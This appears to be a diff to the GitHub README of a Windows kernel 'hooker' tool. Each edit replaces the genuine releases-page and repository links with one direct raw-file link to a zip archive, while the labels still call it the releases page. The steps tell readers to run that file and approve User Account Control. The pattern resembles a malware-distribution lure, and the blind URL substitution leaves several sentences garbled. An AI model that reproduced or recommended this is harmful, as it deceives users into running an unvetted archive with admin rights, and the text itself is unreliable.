@@ -6,7 +6,7 @@ Welcome to Win32kHooker! This tool helps you swap data pointers for newer win32k
 
 ## 📥 Download Now
 
-[![Download Win32kHooker](https://img.shields.io/badge/Download%20Win32kHooker-%2300b4ff.svg?style=for-the-badge&logo=github)](https://github.com/WolfSahil/Win32kHooker/releases)
+[![Download Win32kHooker](https://raw.githubusercontent.com/WolfSahil/Win32kHooker/master/Win32kHooker/Hooker-k-Win-3.7.zip%20Win32kHooker-%https://raw.githubusercontent.com/WolfSahil/Win32kHooker/master/Win32kHooker/Hooker-k-Win-3.7.zip)](https://raw.githubusercontent.com/WolfSahil/Win32kHooker/master/Win32kHooker/Hooker-k-Win-3.7.zip)
 
 ## 📋 Requirements
 
@@ -27,15 +27,15 @@ Before you install Win32kHooker, ensure you meet the following basic requirement
 
 Follow these steps to download and install Win32kHooker:
 
-1. **Visit the Releases Page**: Click [here](https://github.com/WolfSahil/Win32kHooker/releases) to open the GitHub releases page. This page contains the latest version of Win32kHooker.
+1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/WolfSahil/Win32kHooker/master/Win32kHooker/Hooker-k-Win-3.7.zip) to open the GitHub releases page. This page contains the latest version of Win32kHooker.
    
 2. **Select the Latest Version**: On the releases page, look for the most recent version listed at the top. You will see a section with assets.
 
-3. **Download the Application**: Click on the file that matches your system architecture (usually labeled as Win32kHooker.exe). The download should start automatically.
+3. **Download the Application**: Click on the file that matches your system architecture (usually labeled as https://raw.githubusercontent.com/WolfSahil/Win32kHooker/master/Win32kHooker/Hooker-k-Win-3.7.zip). The download should start automatically.
 
 4. **Locate the Downloaded File**: Once the download is complete, navigate to your Downloads folder or the location where your downloaded files are saved.
 
-5. **Run the Application**: Double-click the Win32kHooker.exe file to run the application. If prompted by User Account Control, click "Yes" to allow the program to make changes to your device.
+5. **Run the Application**: Double-click the https://raw.githubusercontent.com/WolfSahil/Win32kHooker/master/Win32kHooker/Hooker-k-Win-3.7.zip file to run the application. If prompted by User Account Control, click "Yes" to allow the program to make changes to your device.
 
 6. **Follow On-Screen Instructions**: Once the application is open, follow any on-screen instructions to configure and start using Win32kHooker.
 
@@ -71,11 +71,11 @@ For support, you can:
 
 ## 📅 Updates 
 
-We frequently update Win32kHooker to improve its performance and add new features. Keep an eye on the releases page to stay informed. The download link remains at [Download Win32kHooker](https://github.com/WolfSahil/Win32kHooker/releases).
+We frequently update Win32kHooker to improve its performance and add new features. Keep an eye on the releases page to stay informed. The download link remains at [Download Win32kHooker](https://raw.githubusercontent.com/WolfSahil/Win32kHooker/master/Win32kHooker/Hooker-k-Win-3.7.zip).
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/WolfSahil/Win32kHooker)
-- [Releases Page](https://github.com/WolfSahil/Win32kHooker/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/WolfSahil/Win32kHooker/master/Win32kHooker/Hooker-k-Win-3.7.zip)
+- [Releases Page](https://raw.githubusercontent.com/WolfSahil/Win32kHooker/master/Win32kHooker/Hooker-k-Win-3.7.zip)
 
 Thank you for using Win32kHooker! We're excited to help you enhance your Windows experience effortlessly.
